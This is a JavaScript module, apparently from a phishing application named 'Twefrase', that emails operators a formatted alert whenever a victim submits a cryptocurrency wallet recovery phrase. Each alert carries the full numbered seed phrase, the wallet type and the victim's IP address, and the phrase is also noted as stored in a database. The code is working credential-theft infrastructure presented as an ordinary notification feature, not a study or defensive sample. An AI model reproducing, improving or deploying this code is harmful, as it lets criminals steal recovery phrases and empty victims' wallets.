import { Resend } from 'resend'

const resend = new Resend(process.env.RESEND_API_KEY)

export async function sendEmailNotification(submission) {
  try {
    console.log('Starting email notification process...')
    console.log('Resend API Key exists:', !!process.env.RESEND_API_KEY)
    
    // Get notification emails from environment variable
    const notificationEmails = process.env.NOTIFICATION_EMAILS?.split(',').map(email => email.trim()) || []
    
    console.log('Notification emails:', notificationEmails)
    
    if (notificationEmails.length === 0) {
      console.log('No notification emails configured')
      return
    }

    // Format the email content
    const emailContent = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px;">
          🔐 New Wallet Phrase Submission
        </h2>
        
        <div style="background-color: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <h3 style="color: #1e293b; margin-top: 0;">Submission Details:</h3>
          
          <table style="width: 100%; border-collapse: collapse;">
            <tr>
              <td style="padding: 8px 0; font-weight: bold; color: #475569;">Wallet Type:</td>
              <td style="padding: 8px 0; color: #1e293b;">${submission.selectedWallet}</td>
            </tr>
            <tr>
              <td style="padding: 8px 0; font-weight: bold; color: #475569;">Submission ID:</td>
              <td style="padding: 8px 0; color: #1e293b;">#${submission.id}</td>
            </tr>
            <tr>
              <td style="padding: 8px 0; font-weight: bold; color: #475569;">Timestamp:</td>
              <td style="padding: 8px 0; color: #1e293b;">${new Date(submission.timestamp).toLocaleString()}</td>
            </tr>
            <tr>
              <td style="padding: 8px 0; font-weight: bold; color: #475569;">IP Address:</td>
              <td style="padding: 8px 0; color: #1e293b;">${submission.ip}</td>
            </tr>
          </table>
        </div>
        
        <div style="background-color: #fef2f2; padding: 20px; border-radius: 8px; border-left: 4px solid #dc2626;">
          <h4 style="color: #dc2626; margin-top: 0;">⚠️ Recovery Phrase:</h4>
          <div style="background-color: #fecaca; padding: 15px; border-radius: 6px; font-family: monospace; font-size: 14px; line-height: 1.6;">
            ${submission.phrase.map((word, index) => `${index + 1}. ${word}`).join('<br>')}
          </div>
        </div>
        
        <div style="margin-top: 20px; padding: 15px; background-color: #f0f9ff; border-radius: 8px; border-left: 4px solid #0ea5e9;">
          <p style="margin: 0; color: #0369a1; font-size: 14px;">
            <strong>Note:</strong> This is an automated notification from your Twefrase application. 
            A new wallet recovery phrase has been submitted and stored in your database.
          </p>
        </div>
        
        <div style="margin-top: 20px; text-align: center; color: #64748b; font-size: 12px;">
          <p>Generated on ${new Date().toLocaleString()}</p>
        </div>
      </div>
    `

         // Send email to all notification addresses
     const emailPromises = notificationEmails.map(email => 
       resend.emails.send({
         from: 'Twefrase <onboarding@resend.dev>',
         to: email,
         subject: `🔐 New Wallet Phrase Submission - ${submission.selectedWallet}`,
         html: emailContent
       })
     )

    // Wait for all emails to be sent
    const results = await Promise.allSettled(emailPromises)
    
    // Log results with detailed error information
    results.forEach((result, index) => {
      if (result.status === 'fulfilled') {
        if (result.value && result.value.error) {
          console.error(`❌ Email failed for ${notificationEmails[index]}:`, result.value.error)
        } else {
          console.log(`✅ Email sent successfully to: ${notificationEmails[index]}`)
        }
      } else {
        console.error(`❌ Failed to send email to ${notificationEmails[index]}:`, result.reason)
      }
    })

    return results

  } catch (error) {
    console.error('Error sending email notification:', error)
    throw error
  }
}
